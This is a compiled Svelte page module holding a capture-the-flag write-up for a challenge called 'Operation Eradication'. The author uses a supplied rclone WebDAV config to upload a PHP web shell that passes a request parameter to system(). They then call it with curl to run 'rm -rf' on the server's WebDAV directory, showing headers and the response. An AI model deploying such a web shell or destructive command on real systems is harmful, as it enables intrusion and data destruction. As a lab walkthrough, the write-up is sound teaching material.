import { c as create_ssr_component } from './ssr-3xKC9Uba.js';

const metadata = {
  "title": "Operation Eradication",
  "description": "Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don't receive payment!",
  "author": "huntress",
  "date": "2023-10-14",
  "published": true
};
const Operation_eradication = create_ssr_component(($$result, $$props, $$bindings, slots) => {
  return `<h1 data-svelte-h="svelte-resiyg">Operation Eradication</h1> <aside data-svelte-h="svelte-148d465">👻 Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don&#39;t receive payment!
<p><em>They stole our data!</em></p> <p>Luckily, we found what looks like a configuration file, that seems to have credentials to the actor’s storage server… but it doesn’t seem to work. Can you get onto their server and delete all the data they stole!?</p></aside> <p data-svelte-h="svelte-1fa4x5">We are given a webserver instance, alongside an <strong><code>operation_eradication</code></strong> file, which is plain Ascii with the following content:</p> <pre class="language-undefined"><!-- HTML_TAG_START -->${`<code class="language-undefined">type = webdav
url = http://localhost/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-64fv4v">We know this is a <code>Webdav</code> server, and that we can access the Webdav instance at <code>http://chal.ctf.games:30236/webdav</code>. Checking out the main page alongside the Webdav endpoint, we can see the server wants to authenticate with a <code>Basic</code> Authorization header, but no matter what we enter, we cannot access the Webdav service.</p> <p data-svelte-h="svelte-1ehhoo"><img src="/img/operation_eradication_img/Untitled.png" alt="1"></p> <p data-svelte-h="svelte-ue5d8c"><img src="/img/operation_eradication_img/Untitled%201.png" alt="Untitled"></p> <p data-svelte-h="svelte-4cp7k9"><img src="/img/operation_eradication_img/Untitled%202.png" alt="Untitled"></p> <p data-svelte-h="svelte-7t7knu">We can try to do a bit of decoding/decryption, but we won’t get a hash analysis tool to give us even a guess - our <code>user</code> and <code>pass</code> strings are 72 characters long, aren’t URL-safe b64 encoded, and are generally just not going to be easily cracked.</p> <p data-svelte-h="svelte-alhwr1">Thankfully, we can Google the config template and find that it belongs to <code>Rclone</code>, which can be used to connect to remote Webdav servers.</p> <p data-svelte-h="svelte-1lmnfxg">Downloading Rclone, we can run through a setup of a config file, and then edit it’s contents to match the file provided:</p> <pre class="language-powershell"><!-- HTML_TAG_START -->${`<code class="language-powershell"><span class="token punctuation">.</span>&#92;rclone config
<span class="token comment"># run through config setup ...</span>
Current remotes:

Name                 <span class="token function">Type</span>
====                 ====
huntress             webdav

<span class="token comment"># ...</span>

s<span class="token punctuation">)</span> <span class="token function">Set</span> configuration password
q<span class="token punctuation">)</span> Quit config
e/n/d/r/c/s/q> q

<span class="token comment"># then replace it's contents with our desired config:</span>

<span class="token function">echo</span> <span class="token string">"[huntress]
type = webdav
url = http://chal.ctf.games:30236/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5"</span> > C:\\Users\\zacwo\\AppData\\Roaming&#92;rclone&#92;rclone<span class="token punctuation">.</span>conf

<span class="token function">cat</span> C:\\Users\\zacwo\\AppData\\Roaming&#92;rclone&#92;rclone<span class="token punctuation">.</span>conf
<span class="token namespace">[huntress]</span>
<span class="token function">type</span> = webdav
url = http:<span class="token operator">/</span><span class="token operator">/</span>chal<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>games:30236/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-10457sn">Next, lets try listing the Webdav’s contents to see if our configuration works:</p> <pre class="language-powershell"><!-- HTML_TAG_START -->${`<code class="language-powershell"><span class="token punctuation">.</span>&#92;rclone tree huntress:
<span class="token operator">/</span>
├── Accounting
│   ├── 2021
│   │   └── AnnualReport<span class="token punctuation">.</span>pdf
│   ├── 2022
│   │   ├── Quarter1_MonthlyRevenue<span class="token punctuation">.</span>xlsx
<span class="token comment"># ...</span>
│   └── Training
│       ├── 2022
│       │   ├── AdvancedSalesSkillsCourse<span class="token punctuation">.</span>pdf
│       │   └── NewSalesRepTraining<span class="token punctuation">.</span>pdf
│       └── SalesTrainingManual<span class="token punctuation">.</span>pdf</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-gp0yxr">Looks like its functional. Unfortunately, we can’t just <code>.\\\\rclone delete huntress:/</code> - I guess some kind of backend configuration on the remote machine stops us from doing this - we do, however, have write permissions, and can upload files to the machine.</p> <p data-svelte-h="svelte-1iojygn">As with any PHP service, we may be able to gain code execution as <code>www-data</code> (who would usually have ownership of <code>/var/www/html/</code>) so my immediate thoughts were that it might be possible to execute code through malicious PHP.</p> <p data-svelte-h="svelte-12vqvs">We tragically can’t execute commands from our Rclone shell, so we’ll have to try to run something from the HTTP service. As the service is publicly available, only requires a single command, and honestly I don’t feel like spinning up <code>ngrok</code> tunnels, we can just use a PHP <code>cmd</code> script:</p> <pre class="language-php"><!-- HTML_TAG_START -->${`<code class="language-php">// written to 'exec.php':

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/pre>"</span><span class="token punctuation">;</span> <span class="token keyword">die</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code>`}<!-- HTML_TAG_END --></pre> <pre class="language-powershell"><!-- HTML_TAG_START -->${`<code class="language-powershell"><span class="token punctuation">.</span>&#92;rclone <span class="token function">copy</span> C:\\<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>\\exec<span class="token punctuation">.</span>php huntress:<span class="token operator">/</span>
<span class="token punctuation">.</span>&#92;rclone <span class="token function">ls</span> huntress:<span class="token operator">/</span>
       50 exec<span class="token punctuation">.</span>php
  1745724 ProductDevelopment/2022/ProductRoadmap<span class="token punctuation">.</span>pdf
  3570194 ProductDevelopment/2023/ProductRoadmap<span class="token punctuation">.</span>pdf
  3510400 HumanResources/EmployeeHandbook<span class="token punctuation">.</span>pdf
  7680849 ProductDevelopment/Specifications/NewProductSpecs<span class="token punctuation">.</span>pdf
  3891213 ProductDevelopment/Specifications/UpdatedProductSpecs<span class="token punctuation">.</span>pdf
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-hv4obh">We still don’t know how to Auth, so we can try to intercept the <code>Rclone</code>↔ <code>Webdav</code> traffic with <code>Wireshark</code>:</p> <pre class="language-powershell"><!-- HTML_TAG_START -->${`<code class="language-powershell">PROPFIND <span class="token operator">/</span>webdav/ HTTP/1<span class="token punctuation">.</span>1
Host: chal<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>games:30236
User-Agent: rclone/v1<span class="token punctuation">.</span>64<span class="token punctuation">.</span>2
Authorization: Basic VkFIeWNZaEsyYXc5VE5GR1NwTWYxYl8yWk5uWnVBTmNJOC0yNmF3R0xZa3dSekp3UF9idU5zWjFlUXdSa21qUW1WenhNZTVyOlN1cGVyRXh0cmVtZWx5U2VjdXJlUGFzc3dvcmRMaWtlQWx3YXlz
Depth: 1
Referer: http:<span class="token operator">/</span><span class="token operator">/</span>chal<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>games:30236/webdav/
Accept-Encoding: gzip</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-3c28lo">Finally, we can use <code>curl</code> to execute <code>bash -c &quot;rm -rf &lt;[the webdav endpoint]&gt;...&quot;;</code>  as a <code>GET</code> param passed to the <code>exec.php</code> file we just uploaded - I’ve included an additional <code>echo &#39;done&#39;</code> command after running <code>rm -rf</code> just as a sanity check, so we know we’re executing a command given the lack of feedback.</p> <p data-svelte-h="svelte-8swnc1">Essentially, we are querying the URI <code>http://chal.ctf.games:30236/webdav/test/exec.php?cmd=bash+-c+\\\\&quot;rm+-rf+/var/www/html/webdav/*;+echo+\\\\&#39;done.\\\\&#39;\\\\&quot;</code> while supplying the header info expected for such an HTTP request:</p> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash">	<span class="token function">curl</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-k</span> <span class="token parameter variable">-X</span> <span class="token string">$'GET'</span> <span class="token punctuation"></span><span class="token punctuation"></span>
    <span class="token parameter variable">-H</span> <span class="token string">$'Host: localhost'</span> <span class="token parameter variable">-H</span> <span class="token string">$'User-Agent: rclone/v1.64.2'</span> <span class="token punctuation"></span><span class="token punctuation"></span>
    <span class="token parameter variable">-H</span> <span class="token string">$'Authorization: Basic VkFIeWNZaEsyYXc5VE5GR1NwTWYxYl8yWk5uWnVBTmNJOC0yNmF3R0xZa3dSekp3UF9idU5zWjFlUXdSa21qUW1WenhNZTVyOlN1cGVyRXh0cmVtZWx5U2VjdXJlUGFzc3dvcmRMaWtlQWx3YXlz'</span> <span class="token punctuation"></span><span class="token punctuation"></span>
		<span class="token parameter variable">-H</span> <span class="token string">$'Depth: 1'</span> <span class="token parameter variable">-H</span> <span class="token string">$'Referer: http://chal.ctf.games:30236/webdav/'</span> <span class="token parameter variable">-H</span> <span class="token string">$'Accept-Encoding: gzip'</span> <span class="token parameter variable">-H</span> <span class="token string">$'Content-Type: application/x-httpd-php'</span> <span class="token punctuation"></span><span class="token punctuation"></span>
    <span class="token string">$'http://chal.ctf.games:30236/webdav/exec.php?cmd=bash+-c+<span class="token entity" title="\\">\\</span>"rm+-rf+/var/www/html/webdav/*;+echo+<span class="token entity" title="\\">\\</span>'</span>done.<span class="token punctuation"></span><span class="token punctuation"></span>'<span class="token punctuation"></span><span class="token punctuation"></span>"'</code>`}<!-- HTML_TAG_END --></pre> <pre class="language-php"><!-- HTML_TAG_START -->${`<code class="language-php">curl <span class="token operator">-</span>i <span class="token operator">-</span>s <span class="token operator">-</span>k <span class="token operator">-</span><span class="token class-name type-declaration">X</span> $<span class="token string single-quoted-string">'GET'</span> \\
    <span class="token operator">-</span><span class="token class-name type-declaration">H</span> $<span class="token string single-quoted-string">'Host: localhost'</span> <span class="token operator">-</span><span class="token class-name type-declaration">H</span> $<span class="token string single-quoted-string">'User-Agent: rclone/v1.64.2'</span> \\
    <span class="token operator">-</span><span class="token class-name type-declaration">H</span> $<span class="token string single-quoted-string">'Authorization: Basic VkFIeWNZaEsyYXc5VE5GR1NwTWYxYl8yWk5uWnVBTmNJOC0yNmF3R0xZa3dSekp3UF9idU5zWjFlUXdSa21qUW1WenhNZTVyOlN1cGVyRXh0cmVtZWx5U2VjdXJlUGFzc3dvcmRMaWtlQWx3YXlz'</span> \\
		<span class="token operator">-</span><span class="token class-name type-declaration">H</span> $<span class="token string single-quoted-string">'Depth: 1'</span> <span class="token operator">-</span><span class="token class-name type-declaration">H</span> $<span class="token string single-quoted-string">'Referer: http://chal.ctf.games:30236/webdav/'</span> <span class="token operator">-</span><span class="token class-name type-declaration">H</span> $<span class="token string single-quoted-string">'Accept-Encoding: gzip'</span> <span class="token operator">-</span><span class="token class-name type-declaration">H</span> $<span class="token string single-quoted-string">'Content-Type: application/x-httpd-php'</span> \\
    $<span class="token string single-quoted-string">'http://chal.ctf.games:30236/webdav/exec.php?cmd=bash+-c+\\"rm+-rf+/var/www/html/webdav/*;+echo+\\'</span>done<span class="token operator">.</span>\\<span class="token string single-quoted-string">'\\"'</span>

<span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">200</span> <span class="token constant">OK</span>
Date<span class="token punctuation">:</span> Fri<span class="token punctuation">,</span> <span class="token number">20</span> Oct <span class="token number">2023</span> <span class="token number">18</span><span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token number">02</span> <span class="token constant">GMT</span>
Server<span class="token punctuation">:</span> Apache<span class="token operator">/</span><span class="token number">2.4</span><span class="token number">.54</span> <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
<span class="token constant">X</span><span class="token operator">-</span>Powered<span class="token operator">-</span>By<span class="token punctuation">:</span> <span class="token constant">PHP</span><span class="token operator">/</span><span class="token number">7.4</span><span class="token number">.33</span>
Vary<span class="token punctuation">:</span> Accept<span class="token operator">-</span>Encoding
Content<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip
Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> text<span class="token operator">/</span>html<span class="token punctuation">;</span> charset<span class="token operator">=</span><span class="token constant">UTF</span><span class="token operator">-</span><span class="token number">8</span></code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-6x8aj4">Refreshing the webapp’s root directory, we get our flag:</p> <p data-svelte-h="svelte-1sjkdte"><img src="/img/operation_eradication_img/Untitled%203.png" alt="Untitled"></p>`;
});

export { Operation_eradication as default, metadata };
//# sourceMappingURL=operation_eradication-6Y_VRygr.js.map
